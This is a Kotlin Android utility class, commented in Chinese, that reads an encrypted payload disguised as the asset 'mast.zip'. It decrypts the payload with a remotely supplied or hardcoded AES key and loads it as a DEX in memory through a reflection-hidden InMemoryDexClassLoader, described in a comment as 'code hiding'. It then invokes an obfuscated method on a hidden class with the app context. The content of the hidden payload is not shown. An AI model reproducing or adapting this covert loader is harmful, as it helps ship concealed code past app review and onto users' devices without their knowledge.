package gh.cark

import android.content.Context
import android.util.Base64
import gh.cark.NcZong
import java.lang.reflect.InvocationTargetException
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * Date：2025/10/22
 * Describe: DEX解密加载工具类
 * 功能：
 * 1. 从assets中读取加密的mast.zip文件
 * 2. 解密得到dex字节数组
 * 3. 使用InMemoryDexClassLoader加载dex
 * 4. 通过NetCong.fanRu方法调用CoreD中的类
 */
object DexLoaderHelper {
    private const val ALGORITHM = "AES"
    
    // DEX AES密钥（从远端下发，存储在NcZong.akv.kuang_key中）
    private val DEX_AES_KEY: ByteArray
        get() {
            val kuangKey = NcZong.getKeyTypeValue(NcZong.akv, "\"kuang_key\"")
            return if (kuangKey.isNotEmpty()) {
                NcZong.showLog("DexLoaderHelper: 使用远端密钥kuang_key")
                kuangKey.toByteArray()
            } else {
                // 如果没有远端密钥，使用默认密钥
                NcZong.showLog("DexLoaderHelper: 使用默认密钥")
                "m6khiy86thg6rf4d".toByteArray()
            }
        }
    
    private const val ENCRYPTED_DEX_FILE = "mast.zip"
    
    /**
     * 主入口方法：加载并执行DEX
     * @param context 应用上下文
     */
    fun loadAndExecuteDex(context: Context) {
        try {
            NcZong.showLog("DexLoaderHelper: 开始加载DEX")
            
            // 1. 从assets读取加密的文本
            val encryptedText = readEncryptedTextFromAssets(context)
            if (encryptedText.isEmpty()) {
                NcZong.showLog("DexLoaderHelper: mast.zip文件为空")
                return
            }
            
            // 2. 解密得到DEX字节数组
            val dexBytes = decryptDex(encryptedText)
            NcZong.showLog("DexLoaderHelper: DEX解密成功，大小=${dexBytes.size} bytes")
            
            // 3. 加载DEX
            loadDexInMemory(context, dexBytes)
            
            NcZong.showLog("DexLoaderHelper: DEX加载完成")
        } catch (e: Exception) {
            NcZong.showLog("DexLoaderHelper 错误: ${e.message}")
            e.printStackTrace()
        }
    }
    
    /**
     * 从assets目录读取加密的文本文件
     */
    private fun readEncryptedTextFromAssets(context: Context): String {
        return try {
            val text = context.assets.open(ENCRYPTED_DEX_FILE).bufferedReader().use { it.readText() }
            NcZong.showLog("DexLoaderHelper: 读取${ENCRYPTED_DEX_FILE}成功，大小=${text.length} bytes")
            text
        } catch (e: Exception) {
            NcZong.showLog("DexLoaderHelper: 读取${ENCRYPTED_DEX_FILE}失败 - ${e.message}")
            ""
        }
    }
    
    /**
     * 解密DEX
     * @param encryptedText Base64编码的加密文本
     * @return 解密后的DEX字节数组
     */
    private fun decryptDex(encryptedText: String): ByteArray {
        // 1. Base64解码
        val encryptedBytes = Base64.decode(encryptedText, Base64.DEFAULT)
        NcZong.showLog("DexLoaderHelper: Base64解码后大小=${encryptedBytes.size} bytes")
        
        // 2. AES解密
        val key = SecretKeySpec(DEX_AES_KEY, ALGORITHM)
        val cipher = Cipher.getInstance(ALGORITHM)
        cipher.init(Cipher.DECRYPT_MODE, key)
        
        return cipher.doFinal(encryptedBytes)
    }
    
    /**
     * 在内存中加载DEX并调用CoreD中的方法
     * @param context 应用上下文
     * @param dexBytes DEX字节数组
     */
    private fun loadDexInMemory(context: Context, dexBytes: ByteArray) {
        try {
            // 创建ByteBuffer
            val byteBuffer = ByteBuffer.wrap(dexBytes)
            
            // 使用反射创建InMemoryDexClassLoader（代码隐藏）
            val clazz = Class.forName("dalvik.system.InMemoryDexClassLoader")
            val constructor = clazz.getDeclaredConstructor(
                Class.forName("java.nio.ByteBuffer"),
                Class.forName("java.lang.ClassLoader")
            )
            
            // 获取应用的ClassLoader
            val parentClassLoader = context.javaClass.getMethod("getClassLoader").invoke(context)
            
            // 创建ClassLoader实例
            val classLoader = constructor.newInstance(byteBuffer, parentClassLoader)
            
            NcZong.showLog("DexLoaderHelper: InMemoryDexClassLoader创建成功")
            
            // 加载DEX中的入口类（com.ggc.show.MasterRu）
            val loadedClass = classLoader.javaClass.getMethod("loadClass", String::class.java)
                .invoke(classLoader, "com.ggc.show.MasterRu") as Class<*>
            
            NcZong.showLog("DexLoaderHelper: 成功加载类 com.ggc.show.MasterRu")
            
            // 直接调用DEX中的方法
            invokeDexMethod(loadedClass, context)
            
        } catch (e: Exception) {
            NcZong.showLog("DexLoaderHelper: 加载DEX失败 - ${e.message}")
            e.printStackTrace()
        }
    }
    
    /**
     * 调用DEX中的方法
     * 使用新的通信方式：只传递context
     * @param coreClass 已加载的Core类
     * @param context 应用上下文
     */
    private fun invokeDexMethod(coreClass: Class<*>, context: Context) {
        try {
            // 检查参数
            NcZong.showLog("DexLoaderHelper: context=${context.javaClass.name}")
            
            // 获取jkks静态方法 - 新签名：(Object context)
            val jkksMethod = coreClass.getDeclaredMethod(
                "jkks",
                Any::class.java        // Object context
            )
            
            // 设置方法可访问
            jkksMethod.isAccessible = true
            
            NcZong.showLog("DexLoaderHelper: 准备调用jkks方法（单参数版本）")
            
            // 调用静态方法，只传递context
            jkksMethod.invoke(null, context)
            
            NcZong.showLog("DexLoaderHelper: jkks方法调用成功")
        } catch (e: NoSuchMethodException) {
            NcZong.showLog("DexLoaderHelper: 找不到jkks方法 - ${e.message}")
            e.printStackTrace()
        } catch (e: InvocationTargetException) {
            NcZong.showLog("DexLoaderHelper: jkks方法执行时抛出异常 - ${e.targetException?.message}")
            e.targetException?.printStackTrace()
        } catch (e: Exception) {
            NcZong.showLog("DexLoaderHelper: 调用jkks方法失败 - ${e.message}")
            e.printStackTrace()
        }
    }
    

}

